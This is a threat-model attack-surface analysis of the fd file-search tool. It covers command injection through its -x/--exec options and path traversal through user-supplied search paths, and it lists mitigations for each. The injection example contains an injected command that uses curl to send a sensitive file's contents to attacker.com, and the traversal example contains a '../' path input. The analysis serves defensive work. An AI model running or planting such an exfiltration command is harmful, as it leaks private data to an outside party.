# Attack Surface Analysis for sharkdp/fd

## Attack Surface: [Command Injection via `-x` or `--exec`](./attack_surfaces/command_injection_via__-x__or__--exec_.md)

*   **Description:**  The ability to inject and execute arbitrary system commands by exploiting insecure handling of user-controlled input when used with `fd`'s `-x` or `--exec` options.
*   **How `fd` contributes to the attack surface:** `fd`'s `-x` and `--exec` options are specifically designed to execute external commands based on the files `fd` finds. This functionality becomes a critical attack vector if the command to be executed, or its arguments, are constructed using unsanitized user input. `fd` acts as the execution engine for these potentially malicious commands.
*   **Example:** An application allows users to specify a command to process files found by `fd`. If the application naively constructs the `fd -x` command by directly embedding user input, a malicious user could input a command like ``; curl attacker.com/exfil_data -d "$(cat sensitive_file)"`` which would be executed by `fd` for each found file, leading to data exfiltration.
*   **Impact:**  Full system compromise, unauthorized data access, data loss, denial of service, privilege escalation. The impact is severe as arbitrary commands can be executed with the privileges of the user running `fd`.
*   **Risk Severity:** **Critical**
*   **Mitigation Strategies:**
    *   **Eliminate the use of `-x` or `--exec` with user-controlled input if at all possible.**  Refactor the application to handle file processing internally, avoiding external command execution via `fd`.
    *   **If `-x` or `--exec` is absolutely necessary with user input, implement extremely strict input sanitization and validation.**  Treat all user input as untrusted and rigorously filter or escape any characters or command sequences that could be used for injection.
    *   **Employ parameterized commands or secure command construction methods.**  Instead of building command strings, utilize programming language features or libraries that allow for safe execution of commands with arguments passed as separate parameters, preventing shell interpretation and injection.
    *   **Apply the Principle of Least Privilege:** Run the application and `fd` with the minimum necessary user privileges. This limits the potential damage even if command injection is successful.

## Attack Surface: [Path Traversal via User-Controlled Search Paths](./attack_surfaces/path_traversal_via_user-controlled_search_paths.md)

*   **Description:**  Gaining unauthorized access to files and directories outside the intended and authorized scope by manipulating the search path provided to `fd` using path traversal techniques (e.g., `../`).
*   **How `fd` contributes to the attack surface:** `fd` directly uses the provided path argument as the starting point for its file system search. If this path is derived from user input without proper validation, `fd` will operate within the user-controlled path, potentially traversing up and outside of intended directory boundaries. `fd`'s search functionality becomes the tool to access unauthorized areas.
*   **Example:** An application allows users to specify a directory to search within. If the application directly passes this user-provided directory to `fd` as the search path, a malicious user could input `../../../../sensitive/config` to force `fd` to search within a sensitive configuration directory located outside the intended application scope, potentially revealing confidential configuration files.
*   **Impact:** Information disclosure, unauthorized access to sensitive files and directories, potential for further exploitation if sensitive files are accessed or modified.
*   **Risk Severity:** **High**
*   **Mitigation Strategies:**
    *   **Thoroughly validate and sanitize user-provided search paths.**  Ensure that the provided path is within the expected base directory and does not contain path traversal sequences like `../`.  Reject any paths that attempt to move outside the allowed scope.
    *   **Utilize absolute paths for defining base search directories within the application.**  Define the permitted search scope using absolute paths and strictly constrain user input to operate within this pre-defined scope.
    *   **Implement robust access control checks within the application itself.**  Regardless of `fd`'s search capabilities, the application should enforce its own access control policies to ensure users can only access files they are explicitly authorized to view, even if `fd` lists them in its output due to path traversal.
    *   **Apply the Principle of Least Privilege (File System Permissions):** Configure file system permissions so that even if path traversal occurs, the application (and consequently `fd`) only has read access to the files and directories that are absolutely necessary for its intended function, minimizing the potential for accessing highly sensitive data.
